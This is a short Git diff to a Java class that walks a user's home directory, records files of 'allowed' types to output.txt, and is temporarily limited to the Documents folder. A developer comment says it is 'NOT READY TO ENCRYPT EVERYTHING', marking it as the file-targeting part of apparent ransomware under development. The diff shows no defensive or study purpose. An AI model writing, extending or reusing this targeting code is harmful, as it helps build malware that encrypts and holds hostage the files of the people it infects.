@@ -36,15 +36,18 @@ public class FindFiles {
 
     public void FindFiles() throws Exception {
         //Use System Property rather than C:\\ to make it OS independent
-        String home = System.getProperty("user.home");
+        //String home = System.getProperty("user.home");
+
+        //FOR DEVELOPMENT - NOT READY TO ENCRYPT EVERYTHING - JUST THE DOCUMENTS FOLDER
+        String home = System.getProperty("user.home")+ File.separator + "Desktop" + File.separator + "Documents";
 
         //Creating a file to write the files found into
-        Writer writer = new FileWriter(home + File.separator + "output.txt", false);
+        Writer writer = new FileWriter(System.getProperty("user.home") + File.separator + "output.txt", false);
         fileWriter = new BufferedWriter(writer);
 
         //List of allowed files
-        ft.addFiles();
-        allowedFiles = ft.AllowedTypes;
+
+        allowedFiles = new FileTypes().AllowedTypes;
 
         //Traverse the file system
         traverse(home);
